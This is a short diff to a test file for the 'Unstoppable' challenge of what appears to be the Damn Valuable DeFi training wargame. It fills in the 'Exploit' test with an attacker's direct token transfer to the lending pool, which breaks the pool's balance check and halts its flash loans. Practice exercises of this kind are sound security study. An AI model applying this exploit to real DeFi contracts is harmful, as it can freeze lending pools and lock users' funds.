@@ -44,12 +44,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-
-        const attackTokenContract = await ethers.getContractAt("DamnValuableToken", this.token.address, attacker);
-        attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
-        
-
-
+        const attackTokenContract = this.token.connect(attacker);
+        await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
